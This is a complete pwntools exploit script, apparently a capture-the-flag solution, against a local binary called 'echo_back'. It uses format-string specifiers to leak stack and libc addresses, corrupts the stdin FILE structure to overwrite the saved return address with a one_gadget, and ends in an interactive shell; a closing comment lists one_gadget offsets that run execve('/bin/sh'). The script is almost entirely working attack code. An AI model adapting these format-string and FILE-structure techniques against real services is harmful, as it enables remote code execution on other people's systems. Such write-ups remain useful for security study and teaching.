from pwn import *
context.log_level = "debug"
p = process("./echo_back")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

cmd = lambda c : p.sendlineafter("choice>>" , str(c))

def set_name(name):
	cmd(1)
	p.sendlineafter("name:" , name)

def echo_back(length , content = None , flag = False):
	cmd(2)
	p.sendlineafter("length:" , length)
	# p.sendline("")
	if content != None:
		p.send(content)
	p.recvuntil("say:")
	if flag:
		num = int(p.recvuntil("----" , drop = True) , 16)
		return num

# stack_offset = 8 + 4 # 12
# name_offset = 12 + 4 # 16
# libc_offset = 15 + 4 # 19
stack_ret_addr = echo_back("-1" , "%12$p" , True) + 8
libc_base = echo_back("-1" , "%19$p" , True) - 240 - libc.sym["__libc_start_main"]
libc.address = libc_base
# set name to std_buf_base addr
stdin_buf_base = libc.sym["_IO_2_1_stdin_"] + 0x38
print(hex(stdin_buf_base))
print(hex(libc.address + 0x3c4918))
set_name(p64(stdin_buf_base)[:7])
# set stdin_buf_base last_byte to 0

echo_back("-1","%16$hhn")
# overwrite stdin_ptr

payload = p64(libc.sym["_IO_2_1_stdin_"] + 131) * 3 + p64(stack_ret_addr) + p64(stack_ret_addr + 0x20)
print(hex(stack_ret_addr))
cmd(2)
p.sendafter("length:" , payload)
p.sendline("") # getchar
# gdb.attach(p)
# pause()
# set _io_read_ptr == _io_read_end by getchar()
pause()
for i in range(len(payload)- 1):
	echo_back("")
# set stack_ret to one_gadget
one_gadget = libc.address + 0xf1147

cmd(2)
p.sendlineafter("length:" , p64(one_gadget))
p.sendline("") # getchar

cmd(3)
p.interactive()
"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

"""




